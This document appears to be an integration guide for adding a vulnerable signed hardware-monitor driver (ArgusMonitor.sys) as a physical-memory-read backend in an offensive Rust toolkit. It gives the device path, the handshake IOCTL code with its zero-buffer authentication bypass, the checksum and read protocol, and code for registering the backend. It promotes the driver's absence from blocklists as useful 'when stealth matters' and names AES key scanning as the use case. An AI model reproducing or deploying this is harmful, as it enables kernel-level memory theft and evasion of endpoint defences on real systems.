# ArgusMonitor Backend — Integration Guide

## Overview

`ArgusMonitorBackend` is a new physical memory reader for the driver chain. It uses the ArgusMonitor.sys hardware monitor driver (signed by Argotronic UG, EV cert) which exposes MmMapIoSpace-based physical memory access with zero meaningful access control.

Key properties:
- Device: `\\.\ArgusMonitorCTLD`
- No privilege check on IRP_MJ_CREATE (trivial 37-byte handler)
- XOR keypad auth is theater — zero buffer is accepted
- No address range restrictions on physical memory
- Not on LOLDrivers, not on HVCI blocklist, no known CVE
- 72 KB binary, not packed or obfuscated

---

## Integration Steps

### 1. Add the file to the project

Copy `argusmonitor_backend.rs` to:
```
D:\Project\toolkit\src\saomola-tui\src\argusmonitor_backend.rs
```

### 2. Declare the module in driver_chain.rs

At the top of `driver_chain.rs`, add:

```rust
mod argusmonitor_backend;
pub use argusmonitor_backend::ArgusMonitorBackend;
```

Alternatively, if you keep it in the same file, paste the struct directly (it uses `super::` imports from `driver_chain.rs`).

### 3. Register in the driver chain

In `DriverChain::new()`, add ArgusMonitor as Priority 4 (after SIVX64), or adjust priority as desired:

```rust
// Priority 4: ArgusMonitor (BYOVD, no access control, no range restrictions)
log("[chain] Probing ArgusMonitor...");
let argus = ArgusMonitorBackend::new();
if argus.is_available() {
    log("[chain] ArgusMonitor available");
} else {
    log("[chain] ArgusMonitor not available");
}
drivers.push(Box::new(argus));
```

### 4. Update `probe_all()`

Add to the `probe_all()` function:

```rust
// ArgusMonitor
let argus = ArgusMonitorBackend::new();
let avail = argus.is_available();
let reason = if avail {
    "Driver loaded and handshake OK".to_string()
} else {
    argus.last_error.clone().unwrap_or("Unknown".into())
};
results.push(("ArgusMonitor".into(), avail, reason));
```

### 5. Update tests

In the test `test_probe_all_returns_three_entries`, update to expect 4 entries:

```rust
assert_eq!(results.len(), 4);
assert_eq!(results[3].0, "ArgusMonitor");
```

---

## Architecture Differences from SivxBackend

| Aspect | SIVX64 | ArgusMonitor |
|--------|--------|--------------|
| Device path | `\\.\SIVDRIVER` | `\\.\ArgusMonitorCTLD` |
| Auth | None (direct open) | XOR handshake (zero-buf accepted) |
| Read model | Direct IOCTL → raw bytes out | Map slot → read DWORDs → unmap |
| Granularity | Arbitrary size per IOCTL | 4 bytes (DWORD) per read IOCTL |
| Range limits | 4B..256KB scatter, 1KB..16MB bulk | No limits (any phys addr) |
| Checksum | None | 2-byte big-endian sum trailer on every buffer |
| Privilege | SeLoadDriverPrivilege needed | Admin-only (no special privilege) |

---

## Protocol Details

### Checksum

Every IOCTL input/output buffer ends with a 2-byte big-endian checksum:
```
checksum = sum(buffer[0..len-2]) & 0xFFFF
buffer[len-2] = checksum >> 8
buffer[len-1] = checksum & 0xFF
```

### Handshake (required before any other IOCTL)

- IOCTL code: `0x9C402B74`
- Input: 0x200 bytes of zeros (includes checksum — sum of zeros is zero)
- Output: 0x210 bytes (driver version/state info, ignored)
- Purpose: Unlock all subsequent IOCTLs for this handle

### Read Strategy

For reads > 4 bytes, the backend:
1. Maps the physical region via `IOCTL_PHYSMEM_MAP` (slot 7)
2. Reads DWORDs sequentially via `IOCTL_PHYSMEM_RD_DW`
3. Unmaps the slot via `IOCTL_PHYSMEM_UNMAP`

For reads <= 4 bytes, uses single-shot `IOCTL_PHYSMEM_SINGLE` (map+read+unmap in one call).

---

## Performance Considerations

The DWORD-at-a-time read model makes this driver slower than SIVX64 for large reads. Each 4KB page requires 1024 DeviceIoControl calls. For the AES key scan use case (scanning specific offsets), this is fine. For bulk memory dump (megabytes), prefer SIVX64 or ASMMAP64.

Estimated throughput:
- Single DWORD: ~50us per call (DeviceIoControl overhead)
- 4KB read: ~1024 calls = ~50ms
- 16 bytes (AES key): ~4 calls = ~200us

---

## Suggested Priority Position

Given the tradeoffs:
- AsIO3 (Priority 1): fast, but has range restrictions on some firmware
- ASMMAP64 (Priority 2): fast, unrestricted, but may be WDAC-blocked
- SIVX64 (Priority 3): fast bulk reads, needs SeLoadDriverPrivilege
- **ArgusMonitor (Priority 4)**: slow for bulk, but no range limits, no special privilege, clean detection profile

ArgusMonitor works best as a fallback when other drivers are blocked or restricted. Its zero detection footprint (no LOLDrivers, no blocklist, no CVE) makes it useful when stealth matters.

---

## Driver Binary Location

Place `ArgusMonitor.sys` at:
```
D:\Project\toolkit\drivers\Vulnerable-Monitors\ArgusMonitor.sys
```

The backend checks this path first, then falls back to `drivers\ArgusMonitor.sys` relative to CWD.
